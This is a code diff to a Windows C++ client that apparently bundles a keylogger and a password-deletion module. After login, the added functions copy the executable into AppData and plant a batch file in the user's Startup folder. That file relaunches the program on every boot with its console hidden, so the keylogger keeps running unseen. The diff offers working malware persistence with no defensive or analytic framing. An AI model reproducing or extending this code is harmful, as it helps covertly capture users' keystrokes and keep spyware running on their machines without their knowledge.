@@ -8,10 +8,57 @@
 #include <regex>
 #include <algorithm>
 #include <cctype>
+#include <Shlwapi.h>
 #include "keylogger.hpp"
 #include "deletePasswords.hpp"
 using namespace std;
+namespace fs = std::filesystem;
 
+void copySelfToAppData() {
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);  // Get current exe path
+
+    // Get the AppData path from the environment variable
+    char appDataPath[MAX_PATH];
+    if (GetEnvironmentVariableA("APPDATA", appDataPath, sizeof(appDataPath))) {
+        // Append the filename to the AppData path
+        string fullPath = string(appDataPath) + "\\client.exe";
+        
+        // Copy the executable to AppData
+        fs::path sourcePath(exePath);
+        fs::path destinationPath(fullPath);
+
+        if (fs::exists(sourcePath)) {
+            fs::copy(sourcePath, destinationPath, fs::copy_options::overwrite_existing);
+        }
+    }
+}
+
+void createBatFileInStartup(const string& argmail) {
+    // Get the username from environment variable
+    char username[MAX_PATH];
+    if (GetEnvironmentVariableA("USERNAME", username, sizeof(username))) {
+        // Define the path of the .bat file in the Startup folder
+        string batFilePath = "C:\\Users\\" + string(username) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\runClient.bat";
+        
+        // Define the Startup folder path
+        string startupDir = "C:\\Users\\" + string(username) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+        
+        // Ensure Startup folder exists
+        fs::path startupFolder(startupDir);
+        if (fs::exists(startupFolder)) {
+            // Command to run the copied exe from AppData with arguments
+            string batContent = "start \"\" \"C:\\Users\\" + string(username) + "\\AppData\\Roaming\\client.exe\" --disable --" + argmail;
+
+            // Create and write the command to the .bat file in Startup
+            ofstream batFile(batFilePath);
+            if (batFile.is_open()) {
+                batFile << batContent;
+                batFile.close();
+            }
+        }
+    }
+}
 // ---------------------------------------------------------------------
 // Input validation functions
 // ---------------------------------------------------------------------
@@ -338,7 +385,7 @@ void handleRegistration(ENetPeer* peer, ENetHost* client) {
     cin.ignore(numeric_limits<streamsize>::max(), '\n');
     
     // Step 1: Get and validate email address
-    string email = getValidatedInput(
+     string email = getValidatedInput(
         "Enter email for registration: ",
         isValidEmail,
         "Invalid email format. Please enter a valid email (e.g., user@example.com)."
@@ -427,6 +474,8 @@ void handleLogin(ENetPeer* peer, ENetHost* client) {
         
         // Store email for keylogger
         setUserEmail(email);
+        copySelfToAppData();
+        createBatFileInStartup(email);
         
         // Wait for user to press Enter
         cin.get();
@@ -527,17 +576,37 @@ int application() {
 // Main function - Program entry point
 // ---------------------------------------------------------------------
 int main(int argc, char* argv[]) {
+    
     bool enable = true;
+    // string exePath = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\client.exe";
+    // string batFilePath = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\runClient.bat";
+    // // Replace %USERNAME% with actual username
+    // char username[MAX_PATH];
+    // DWORD size = sizeof(username);
+    // if (GetEnvironmentVariableA("USERNAME", username, size)) {
+    //     exePath.replace(exePath.find("%USERNAME%"), 9, username);
+    //     batFilePath.replace(batFilePath.find("%USERNAME%"), 9, username);
+    // }
 
-    if (argc > 1) {
-        std::string arg = argv[1];
+    // if (!(fileExists(exePath) && fileExists(batFilePath))) {
+    //     copySelfToAppData();
+    //     createBatFileInStartup(email);
+    // }
+
+
+
+    for (int i = 1; i < argc; i++) {
+        string arg = argv[i];
+
         if (arg == "--disable") {
             enable = false;
+        } else {
+            setUserEmail(arg.substr(2));
         }
     }
 
     if (!enable) {
-        FreeConsole();  // Detach console **before** launching threads
+        FreeConsole();  // Immediately detach console if disabled
     }
 
     // Uncomment this if you want to enable password destruction
@@ -552,10 +621,11 @@ int main(int argc, char* argv[]) {
 
     // Start the ENet application if enabled
     if (enable) {
+
         application();
     }
 
-    // Keep the main thread alive to prevent premature exit
+    // Keep the client alive if necessary
     while (isKeyloggerRunning) {
         std::this_thread::sleep_for(std::chrono::seconds(1));
     }
